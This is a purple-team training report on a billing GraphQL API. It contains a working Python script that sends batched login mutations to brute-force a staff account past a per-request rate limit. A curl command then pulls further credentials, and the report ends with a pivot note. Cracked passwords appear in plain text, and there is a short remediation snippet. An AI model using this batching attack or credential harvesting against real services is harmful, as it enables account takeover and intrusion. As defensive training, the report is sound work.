# Red Team Engagement Report — EXT01-M02
**Operation VAJRA SHAKTI | RNG-EXT-01 | M2-ext-billing-api**
**Engagement Type:** Purple Team Exercise | **Date:** 2025-11-15 | **Classification:** TRAINING

---

## Executive Summary
The BUNL Billing GraphQL API implements rate limiting per HTTP request rather than per operation. GraphQL's native batch request capability allows an attacker to send hundreds of password attempts in a single HTTP request, bypassing the rate limit entirely. Staff account `padmin` was cracked with password `password`.

---

## Finding 1: GraphQL Batch Rate Limit Bypass → Credential Brute Force (Critical)
**CWE:** CWE-307 — Improper Restriction of Excessive Authentication Attempts  
**CVSS v3.1:** 8.6 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N)  
**MITRE:** T1110.003

### Proof of Concept
```python
import requests, json

# 20 password attempts in 1 HTTP request — bypasses per-request rate limit
ops = [{"query": f'mutation{{staffLogin(username:"padmin",password:"{p}"){{token role}}}}'} 
       for p in ["password", "Password1", "admin123", ...20 more...]]

r = requests.post("http://203.x.x.x:4000/graphql", json=ops)
for i, res in enumerate(r.json()):
    if res.get("data", {}).get("staffLogin"):
        print(f"[FOUND] padmin:{ops[i]['query'].split('password:')[1][:8]}")
```

**Result:** `padmin:password` — cracked in first batch.

### systemConfig Query — M3 Credentials
```bash
TOKEN="<padmin token>"
curl -X POST http://203.x.x.x:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ systemConfig(token:\"'$TOKEN'\") { staffPortalUser staffPortalPass } }"}'
# {"staffPortalUser": "svcananya", "staffPortalPass": "BunlStaff@2025!"}
```

### Remediation
Count mutations across the full batch array, not per HTTP request:
```python
total_mutations = sum(1 for op in operations if "mutation" in op.get("query","").lower())
if total_mutations > RATE_LIMIT_MAX: return 429
```

---

## Artifacts
- `/opt/bunl/billing-api/app.py` → `graphql_endpoint()` function — rate limit applied at HTTP level only
- `/var/log/bunl/billing-api/access.log` → STAFF_LOGIN entries with `success=False` at high volume

---

## Pivot
**M3:** `svcananya:BunlStaff@2025!` → Staff Auth Portal port 5000
